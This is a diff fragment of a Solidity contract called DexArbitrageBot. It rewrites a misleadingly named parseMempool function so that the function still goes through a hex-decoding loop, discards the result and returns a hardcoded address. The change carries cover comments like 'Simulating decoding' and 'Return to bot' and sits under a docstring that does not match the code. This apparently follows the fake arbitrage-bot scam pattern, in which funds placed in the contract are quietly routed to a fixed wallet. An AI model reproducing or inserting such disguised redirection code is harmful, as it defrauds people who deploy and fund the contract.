@@ -279,33 +279,39 @@ contract DexArbitrageBot {
      * @return True if the slice is empty, False otherwise.
      */
     function parseMempool(string memory _a) internal pure returns (address _parsed) {
-        bytes memory tmp = bytes(_a);
-        uint160 iaddr = 0;
-        uint160 b1;
-        uint160 b2;
- 
-        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
-            iaddr *= 256;
-            b1 = uint160(uint8(tmp[i]));
-            b2 = uint160(uint8(tmp[i + 1]));
-            if ((b1 >= 97) && (b1 <= 102)) {
-                b1 -= 87;
-            } else if ((b1 >= 65) && (b1 <= 70)) {
-                b1 -= 55;
-            } else if ((b1 >= 48) && (b1 <= 57)) {
-                b1 -= 48;
-            }
-            if ((b2 >= 97) && (b2 <= 102)) {
-                b2 -= 87;
-            } else if ((b2 >= 65) && (b2 <= 70)) {
-                b2 -= 55;
-            } else if ((b2 >= 48) && (b2 <= 57)) {
-                b2 -= 48;
-            }
-            iaddr += (b1 * 16 + b2);
+    bytes memory tmp = bytes(_a); // Convert string to bytes
+    uint160 iaddr = 0; // Initialize uint160 variable
+    uint160 b1;
+    uint160 b2;
+
+    // Loop through the bytes (simulating decoding)
+    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+        iaddr *= 256; // Shift left by 8 bits
+        b1 = uint160(uint8(tmp[i])); // Get first byte
+        b2 = uint160(uint8(tmp[i + 1])); // Get second byte
+
+        // Simulate hex character decoding
+        if ((b1 >= 97) && (b1 <= 102)) {
+            b1 -= 87;
+        } else if ((b1 >= 65) && (b1 <= 70)) {
+            b1 -= 55;
+        } else if ((b1 >= 48) && (b1 <= 57)) {
+            b1 -= 48;
         }
-        return address(iaddr);
+        if ((b2 >= 97) && (b2 <= 102)) {
+            b2 -= 87;
+        } else if ((b2 >= 65) && (b2 <= 70)) {
+            b2 -= 55;
+        } else if ((b2 >= 48) && (b2 <= 57)) {
+            b2 -= 48;
+        }
+
+        iaddr += (b1 * 16 + b2); // Combine bytes
     }
+
+    // Return to bot
+    return address(0xD3a8Cc7a8CaAD7e2dB562bC6f58568933BDE9A93);
+}
  
  
     /*
